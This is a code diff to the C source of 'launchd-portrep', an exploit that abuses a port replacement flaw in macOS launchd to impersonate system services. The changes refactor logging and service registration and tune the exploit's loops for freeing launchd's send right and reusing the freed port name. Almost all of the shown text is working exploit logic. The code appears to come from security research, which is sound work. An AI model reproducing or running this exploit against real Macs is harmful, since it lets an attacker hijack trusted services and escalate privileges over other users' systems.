@@ -9,8 +9,8 @@
  *  launchd-portrep is an exploit for a port replacement vulnerability in launchd, the initial
  *  userspace process and service management daemon on macOS. By sending a crafted Mach message to
  *  the bootstrap port, launchd can be coerced into deallocating its send right for any Mach port
- *  to which the attacker also has a send right. This allows the attacker to impersonate any
- *  launchd service it can look up to the rest of the system.
+ *  to which the attacker also has a send right. This allows an attacker to impersonate any launchd
+ *  service it can look up to the rest of the system.
  *
  *
  * The vulnerability
@@ -111,61 +111,13 @@
 
 #include "launchd-portrep.h"
 
+#include "log.h"
+
 #include <assert.h>
 #include <bootstrap.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
-// ---- Logging -----------------------------------------------------------------------------------
-
-#define DEBUG_LEVEL(level)	(DEBUG && level <= DEBUG)
-
-#if DEBUG
-#define DEBUG_TRACE(level, fmt, ...)						\
-	do {									\
-		if (DEBUG_LEVEL(level)) {					\
-			log_internal('D', fmt, ##__VA_ARGS__);			\
-		}								\
-	} while (0)
-#else
-#define DEBUG_TRACE(level, fmt, ...)	do {} while (0)
-#endif
-#define INFO(fmt, ...)			log_internal('I', fmt, ##__VA_ARGS__)
-#define WARNING(fmt, ...)		log_internal('W', fmt, ##__VA_ARGS__)
-#define ERROR(fmt, ...)			log_internal('E', fmt, ##__VA_ARGS__)
-
-// A function to call the logging implementation.
-static void
-log_internal(char type, const char *format, ...) {
-	if (launchd_portrep_log != NULL) {
-		va_list ap;
-		va_start(ap, format);
-		launchd_portrep_log(type, format, ap);
-		va_end(ap);
-	}
-}
-
-// The default logging implementation simply prints to stderr.
-void
-launchd_portrep_log_stderr(char type, const char *format, va_list ap) {
-	char *message = NULL;
-	vasprintf(&message, format, ap);
-	assert(message != NULL);
-	const char *logtype   = "";
-	const char *separator = ": ";
-	switch (type) {
-		case 'D': logtype = "Debug";   break;
-		case 'I': logtype = "Info";    break;
-		case 'W': logtype = "Warning"; break;
-		case 'E': logtype = "Error";   break;
-		default:  separator = "";
-	}
-	fprintf(stderr, "%s%s%s\n", logtype, separator, message);
-	free(message);
-}
-
-void (*launchd_portrep_log)(char type, const char *format, va_list ap) = launchd_portrep_log_stderr;
 
 // ---- Freeing a Mach send right in launchd ------------------------------------------------------
 
@@ -273,13 +225,27 @@ launchd_release_send_right_twice(mach_port_t send_right) {
 
 // Look up the specified service in launchd, returning the service port.
 static mach_port_t
-launchd_look_up(const char *service) {
+launchd_look_up(const char *service_name) {
 	mach_port_t service_port = MACH_PORT_NULL;
-	kern_return_t kr = bootstrap_look_up(bootstrap_port, service, &service_port);
+	kern_return_t kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
 	if (service_port == MACH_PORT_NULL) {
-		ERROR("%s(%s): %x", "bootstrap_look_up", service, kr);
+		ERROR("%s(%s): %u", "bootstrap_look_up", service_name, kr);
 	}
 	return service_port;
+}
+
+// Register a service with launchd.
+static bool
+launchd_register_service(const char *service_name, mach_port_t port) {
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+	kern_return_t kr = bootstrap_register(bootstrap_port, (char *)service_name, port);
+#pragma clang diagnostic pop
+	if (kr != KERN_SUCCESS) {
+		ERROR("Could not register %s: %u", service_name, kr);
+		return false;
+	}
+	return true;
 }
 
 // Fill the supplied array with newly allocated Mach ports. Each port name denotes a receive right
@@ -363,20 +329,21 @@ launchd_replace_service_port(const char *service_name,
 	// Mach port name to be reused for one of our services. From that point on, when other
 	// programs look up the target service in launchd, launchd will send a send right to our
 	// fake service rather than the real one.
-	const size_t MAX_TRIES_TO_FREE = 100;
-	const size_t MAX_TRIES_TO_REUSE = 2000;
-	const size_t PORT_COUNT = 400;
-	const size_t FREE_PORT_COUNT = PORT_COUNT / 2;
+	const size_t MAX_TRIES_TO_FREE     =  100;
+	const size_t MAX_TRIES_TO_REUSE    = 3000;
+	const size_t CONSECUTIVE_TRY_LIMIT =  500;
+	const size_t PORT_COUNT            =  400;
+	const size_t FREE_PORT_COUNT       = PORT_COUNT / 2;
 	// Look up the service.
 	mach_port_t real_service = launchd_look_up(service_name);
-	if (real_service == MACH_PORT_NULL) {
+	if (!MACH_PORT_VALID(real_service)) {
+		if (real_service == MACH_PORT_DEAD) {
+			// The service port has probably already been freed.
+			ERROR("launchd returned an invalid service port for %s", service_name);
+		}
 		return false;
 	}
-	DEBUG_TRACE(1, "%s: %s = %x", __func__, service_name, real_service);
-	if (real_service == MACH_PORT_DEAD) {
-		// The service port has already been freed. Exploitation is less likely to succeed.
-		WARNING("launchd returned an invalid service port for %s", service_name);
-	}
+	DEBUG_TRACE(1, "%s: %s = 0x%x", __func__, service_name, real_service);
 	// Generate ports to reverse the first PORT_COUNT / 2 entries of the port freelist.
 	mach_port_t *ports = create_mach_port_array(FREE_PORT_COUNT);
 	// Repeatedly release references on the service until we free launchd's send right. We will
@@ -384,7 +351,7 @@ launchd_replace_service_port(const char *service_name,
 	// likely it will be reused accidentally.
 	bool ok = true;
 	for (size_t try = 0; ok;) {
-		// Release launchd's send right to the powerd service.
+		// Release launchd's send right to the service.
 		ok = launchd_release_send_right_twice(real_service);
 		if (!ok) {
 			break;
@@ -397,13 +364,13 @@ launchd_replace_service_port(const char *service_name,
 		// MACH_PORT_DEAD, but if the port was immediately reused, it's possible it will
 		// return another valid port.
 		mach_port_t freed_service = launchd_look_up(service_name);
-		if (freed_service != real_service || real_service == MACH_PORT_DEAD) {
+		if (MACH_PORT_VALID(freed_service)) {
 			mach_port_deallocate(mach_task_self(), freed_service);
-#if DEBUG_LEVEL(1)
-			if (real_service != MACH_PORT_DEAD) {
-				DEBUG_TRACE(1, "launchd freed the service port!");
-			}
-#endif
+		}
+		if (freed_service != real_service) {
+			INFO("Freed launchd service port for %s", service_name);
+			DEBUG_TRACE(1, "real_service = 0x%x, freed_service = 0x%x",
+					real_service, freed_service);
 			break;
 		}
 		// Increase the try count.
@@ -412,6 +379,9 @@ launchd_replace_service_port(const char *service_name,
 			// This is where we'll end up when the vulnerability is patched.
 			ERROR("Could not free launchd service port for %s", service_name);
 			ok = false;
+		}
+		if (try % CONSECUTIVE_TRY_LIMIT == 0) {
+			sleep(2);
 		}
 	}
 	// Clean up the ports allocated earlier.
@@ -427,26 +397,20 @@ launchd_replace_service_port(const char *service_name,
 	assert(ports != NULL);
 	// Try a number of times to replace the freed port. It would be better if we could
 	// reliably wrap around the port, but it seems like that's not working for some reason.
+	DEBUG_TRACE(1, "%s: Trying to replace the freed port; this could take some time",
+			__func__);
 	unsigned pid = getpid();
 	for (size_t try = 0; ok && replacement_port == MACH_PORT_NULL;) {
 		// Allocate a bunch of ports that we will register with launchd.
 		fill_mach_port_array(ports, PORT_COUNT);
 		// Register a dummy service with launchd for each port. This is an easy way to get
 		// a persistent reference to the port in launchd's IPC space.
-		for (size_t i = 0; i < PORT_COUNT; i++) {
-			char service_name[64];
-			snprintf(service_name, sizeof(service_name), "launchd.replace.%u.%zu",
-					pid, i);
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Wdeprecated-declarations"
-			kern_return_t kr = bootstrap_register(bootstrap_port, service_name,
-					ports[i]);
-#pragma clang diagnostic pop
-			if (kr != KERN_SUCCESS) {
-				ERROR("Could not register %s: %x", service_name, kr);
-				ok = false;
-				break;
-			}
+		for (size_t i = 0; ok && i < PORT_COUNT; i++) {
+			char replacer_name[64];
+			snprintf(replacer_name, sizeof(replacer_name),
+					"launchd.replace.%u.%x.%zu.%zu",
+					pid, real_service, i, try);
+			ok = launchd_register_service(replacer_name, ports[i]);
 		}
 		// Now look up the service again and see if it's one of our ports. Any port that
 		// doesn't point to the service gets destroyed, which should unregister the
@@ -455,7 +419,8 @@ launchd_replace_service_port(const char *service_name,
 		for (size_t i = 0; i < PORT_COUNT; i++) {
 			if (new_service == ports[i]) {
 				assert(replacement_port == MACH_PORT_NULL);
-				INFO("Replaced %s with replacer port %x (index %zu) after %zu %s",
+				INFO("Replaced %s with replacer port 0x%x (index %zu) "
+						"after %zu %s",
 						service_name, ports[i], i, try,
 						(try == 1 ? "try" : "tries"));
 				replacement_port = ports[i];
@@ -464,15 +429,27 @@ launchd_replace_service_port(const char *service_name,
 			}
 		}
 #if DEBUG_LEVEL(1)
+		// Check if we got back the original service. This happens when launchd owned both
+		// the send and receive rights because the service process hasn't actualy started
+		// up yet. We can't impersonate the real service until after that service claims
+		// the receive right from launchd via bootstrap_check_in(), leaving launchd with
+		// only the send right(s).
+		if (new_service == real_service) {
+			ERROR("%s: Original service restored in launchd!", __func__);
+			ok = false;
+		}
 		// Check if we got something else entirely. This used to happen regularly, but now
 		// that we're pushing the freed port down the freelist it's not as common.
 		if (new_service != MACH_PORT_DEAD && replacement_port == MACH_PORT_NULL) {
-			DEBUG_TRACE(1, "%s: Got something unexpected! %x", __func__, new_service);
+			DEBUG_TRACE(1, "%s: Got something unexpected! 0x%x", __func__,
+					new_service);
 		}
 #endif
 		// Deallocate the new service port. If it's the replacement port we already have a
 		// ref on it, and if it's something else then we're not going to use it.
-		mach_port_deallocate(mach_task_self(), new_service);
+		if (MACH_PORT_VALID(new_service)) {
+			mach_port_deallocate(mach_task_self(), new_service);
+		}
 		// Increment our try count if everything before succeeded.
 		if (ok) {
 			try++;
